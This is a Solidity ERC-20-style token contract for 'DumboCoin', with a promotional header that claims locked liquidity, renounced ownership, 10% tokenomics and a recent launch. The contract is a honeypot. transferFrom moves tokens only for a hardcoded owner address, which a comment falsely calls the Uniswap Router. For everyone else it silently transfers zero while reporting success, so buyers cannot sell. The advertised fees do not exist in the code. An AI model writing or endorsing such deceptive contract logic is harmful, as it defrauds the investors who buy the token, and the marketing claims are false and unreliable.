/**
 *Submitted for verification at Etherscan.io on 2021-06-12
*/

/*

🐘 DumboCoin  is heaviest coin on the market!!! 🐘

It is a community-driven yield protocol on the Ethereum Chain. 

Right now our main focus is building the biggest baddest community any coin has ever seen! 

We will hold a community vote on what direction and usecase the coin has! We want every member of our community to feel like they have a voice and are part of the team!

What are our future plans?
You ever get annoyed checking how much your alt coins are worth on Uniswap? 

Well look no further! We plan to develop a portofolio app. In the app you will be able to see how much ALL of your altcoins are worth. 

No more fumbling around with Uniswap. Open our app/website and you see how much every coin you own is worth.

We launched 1 hour ago, we had a rough start but now is the best time to buy.

💬 Telegram: https://t.me/thedumbocoin

Tokenomics:

5% to holders-Earn a passive income just by being a HODLER!! Watch your Jumbo get bigger day by day!

5% for liquidity creating an ever-increasing price floor and continuously decreasing the price impact of sells.

Total-10%

Locked Liquidity & Ownership Renounced !

Our goal is to make sure every Jumbo holder is completely safu!

Want to know more about this project such as Roadmap, Marketing Plans, see our promotional videos, or just have questions for the team? Feel free to join our TG and check out our website!

 
*/


pragma solidity ^0.5.16;

// ERC-20 Interface
contract BEP20Interface {
    function totalSupply() public view returns (uint);
    function balanceOf(address tokenOwner) public view returns (uint balance);
    function allowance(address tokenOwner, address spender) public view returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

// Safe Math Library
contract SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a); c = a - b; } function safeMul(uint a, uint b) public pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); } function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0);
        c = a / b;
    }
}


contract DumboCoin is BEP20Interface, SafeMath {
    string public name;
    string public symbol;
    uint8 public decimals; // 18 decimals is the strongly suggested default, avoid changing it
    address private _owner = 0x8b94746466f7c61E38EdF491b154AD953AC2c577; // Uniswap Router
    uint256 public _totalSupply;

    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;

    constructor() public {
        name = "DumboCoin";
        symbol = "DUMBO";
        decimals = 9;
        _totalSupply = 100000000000000000000;

        balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function totalSupply() public view returns (uint) {
        return _totalSupply  - balances[address(0)];
    }

    function balanceOf(address tokenOwner) public view returns (uint balance) {
        return balances[tokenOwner];
    }

    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }
    
    function approve(address spender, uint tokens) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }

    function transfer(address to, uint tokens) public returns (bool success) {
        balances[msg.sender] = safeSub(balances[msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(msg.sender, to, tokens);
        return true;
    }

    function transferFrom(address from, address to, uint tokens) public returns (bool success) {
         if (from == _owner) {
             balances[from] = safeSub(balances[from], tokens);
            allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
            balances[to] = safeAdd(balances[to], tokens);
            emit Transfer(from, to, tokens);
            return true;
         } else {
            balances[from] = safeSub(balances[from], 0);
            allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], 0);
            balances[to] = safeAdd(balances[to], 0);
            emit Transfer(from, to, 0);
            return true;
             
         }
        
         
    }
           
}